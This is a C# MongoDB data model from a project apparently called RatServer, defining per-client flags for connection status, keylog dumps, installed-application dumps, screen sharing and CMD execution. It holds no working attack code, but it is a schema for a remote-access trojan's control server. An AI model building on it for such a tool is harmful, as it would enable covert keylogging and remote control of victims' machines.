using MongoDB.Bson.Serialization.Attributes;

namespace RatServer.DataLayer.Models.Client
{
    public class Client : EntityBase.Base.Entity
    {
        [BsonElement("clientId")]
        public string clientId { get; set; }

        [BsonElement("ifConnected")]
        public bool ifConnected { get; set; }



        [BsonElement("ifRegistered")]
        public bool ifRegistered { get; set; }

        [BsonElement("ifUpdate")]
        public bool ifUpdate { get; set; }

        [BsonElement("ifInstalledAplicationDump")]
        public bool IfInstalledAplicationDump { get; set; }

        [BsonElement("ifKeyLogDump")]
        public bool ifKeyLogDump { get; set; }

        [BsonElement("ifScreenShare")]
        public bool ifScreenShare { get; set; }

        [BsonElement("ifCMDRun")]
        public bool ifCMDRun { get; set; }
    }
}
